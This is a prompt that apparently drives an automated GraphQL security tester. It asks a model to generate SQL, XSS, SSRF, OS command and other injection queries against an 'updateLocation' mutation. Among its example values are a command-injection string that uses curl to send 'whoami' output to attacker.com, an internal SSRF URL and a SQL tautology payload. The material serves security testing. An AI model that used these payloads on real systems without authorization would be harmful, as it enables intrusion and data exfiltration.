prompt:
You are an expert in GraphQL API security testing. Goal: generate valid GraphQL queries for the operation shown, to get successful responses (HTTP 200) quickly while exploring robustness and testing for specific vulnerability types. CRITICAL REQUIREMENT: You MUST include at least one query for a basic call and EACH of the following vulnerability types: - SQL Injection - XSS Injection - SSRF Injection - OS Command Injection - Path Injection - HTML Injection - Query Deny Bypass (REQUIRES TWO QUERIES: non-aliased and aliased) - Introspection - Field Suggestions Strict Requirements: 1) Queries must be syntactically valid GraphQL. 2) No placeholders like , "ID!", "value". Use realistic literals or known real values. 3) You may attempt injected strings, nulls, overlong strings, and type mismatches where appropriate. 4) You may output 1 query(ies) but MUST cover all vulnerability types listed above. 5) Do not use the words "edges" or "node". 6) GraphQL is case-sensitive. Match the exact operation name: updateLocation. 7) If there are previous response pairs, use them to generate the query. 8) For each vulnerability type, craft queries that specifically test for that vulnerability pattern. 9) CRITICAL: Label each query with its vulnerability type using the format: ****** before each ```graphql block. 10) SPECIAL CASE: For Query Deny Bypass, you MUST generate TWO queries: - First query: Non-aliased version (normal query structure) - Second query: Aliased version (using query aliases like "s: queryName") Both queries should test the same operation but with different structures to test access control bypass. SCHEMA (authoritative): - schema types: {'Location': {'kind': 'OBJECT', 'fields': [{'name': 'id', 'type': 'ID!'}, {'name': 'lat', 'type': 'Float'}, {'name': 'lng', 'type': 'Float'}, {'name': 'name', 'type': 'String!'}]}} - output fields (if known): Location Use only fields/args compatible with this schema. Context: - operation: updateLocation - input (declared): updateLocation, input: {'locationID': 'ID!', 'lat': 'Float', 'lng': 'Float', 'name': 'String'} - node type: mutation - known real values: GraphQL source: mutation Query: updateUser Node Type: User Fields: - id: daff5009-dcd4-407b-99dd-ba5b3e881eee - description: http://internal-api.local/status GraphQL source: mutation Query: updateUser Node Type: User Fields: - id: 8b0abef7-5e4c-4206-991a-267887055a2a - description: GraphQL source: mutation Query: updateWallet Node Type: Wallet Fields: - id: 1636d1ba-5333-4bc3-9426-d94526377e52 - name: GraphQL source: mutation Query: updateUser Node Type: User Fields: - id: d3faa899-1549-45b9-ac48-7af91ac22828 - firstName: Valid - lastName: User - description:

Hello, World!

GraphQL source: mutation Query: updateUser Node Type: User Fields: - id: babaa70d-3491-4dd6-a59e-91dac2403944 - lastName: Injection; curl http://attacker.com/$(whoami); Argument strategy: reuse known-good values from context and previous 200 responses. Selection depth target: 1. Keep nested selections no deeper than 1 levels. Output format: Each query must be in its own fenced block with a vulnerability type label: Vulnerability Type Labels Are: - SQL_Injection - XSS_Injection - SSRF_Injection - OS_Command_Injection - Path_Injection - HTML_Injection - Query_Deny_Bypass_Non_Aliased - Query_Deny_Bypass_Aliased - Introspection - Field_Suggestions - Basic_Call ****** ```graphql ``` Example: ***SQL_Injection*** ```graphql query { users(filter: "1' OR '1'='1") { id name } } ``` ***XSS_Injection*** ```graphql query { search(term: "") { results } } ```
